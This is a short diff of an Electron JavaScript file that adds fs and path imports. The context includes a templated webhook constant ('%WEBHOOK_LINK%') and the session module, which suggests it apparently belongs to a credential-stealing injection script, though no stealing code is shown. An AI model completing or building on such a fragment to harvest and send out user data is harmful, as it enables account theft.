@@ -3,7 +3,8 @@ const {
     BrowserWindow,
     session
 } = require('electron');
-
+const fs = require('fs');
+const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
 const webhook = "%WEBHOOK_LINK%";
